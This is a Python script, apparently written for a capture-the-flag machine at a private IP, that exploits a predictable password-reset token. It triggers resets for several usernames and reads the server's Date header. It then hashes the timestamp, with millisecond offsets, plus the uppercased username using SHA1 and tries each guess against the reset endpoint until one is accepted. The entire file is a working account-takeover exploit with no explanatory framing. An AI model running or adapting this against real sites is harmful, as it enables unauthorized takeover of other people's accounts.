import requests
from datetime import datetime, timedelta
import hashlib
import os
import concurrent.futures


target_ip = "10.10.75.11"
usernames = ["administrator", "jane", "clocky", "clarice"]

url = f'http://{target_ip}:8080/forgot_password'
password_reset_url = f"http://{target_ip}:8080/password_reset?token="

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': f'http://{target_ip}:8080',
    'Proxy-Connection': 'keep-alive',
    'Referer': f'http://{target_ip}:8080/forgot_password',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36'
}

def color_text(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

def generate_and_test_token(username):
    header = f"| {'Username':<15} | {'Token':<40} | {'Response':<20} | {'Token Input':<65} |"
    print(color_text(header, 34))
    print(color_text("-" * len(header), 34))

    data = {'username': username}
    
    response = requests.post(url, headers=headers, data=data, verify=False)
    response_date = response.headers.get('Date')
    print(response_date)
    if "A reset link has been sent to your e-mail" in response.text:
        print("Email reset link has been sent. Time to generate tokens to match the timestamp/hash")
    
    if response_date:
        response_datetime = datetime.strptime(response_date, "%a, %d %b %Y %H:%M:%S GMT")
        print(response_datetime)
        for milliseconds in range(100):
            new_datetime = response_datetime + timedelta(milliseconds=milliseconds)
            milliseconds_string = f"{milliseconds:02}"
            formatted_time = new_datetime.strftime("%Y-%m-%d %H:%M:%S.") + milliseconds_string
            token_input = formatted_time + " . " + username.upper()
            token = hashlib.sha1(token_input.encode("utf-8")).hexdigest()
            token_response = requests.get(password_reset_url + token, verify=False)
            response_summary = token_response.text[:20] + "..."
            row = f"| {username:<15} | {token:<40} | {token_input:<40} | {response_summary:<30} "

            if "<h2>Invalid token</h2>" not in token_response.text:
                print(color_text(row, 32))
                return f"Valid Token Found for {username}: {token}"
            else:
                print(row)
    else:
        print("Date header not found in response.")
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    future_to_username = {executor.submit(generate_and_test_token, username): username for username in usernames}
    for future in concurrent.futures.as_completed(future_to_username):
        username = future_to_username[future]
        try:
            result = future.result()
            if result:
                print(result)
                break
        except Exception as exc:
            print(f"{username} generated an exception: {exc}")
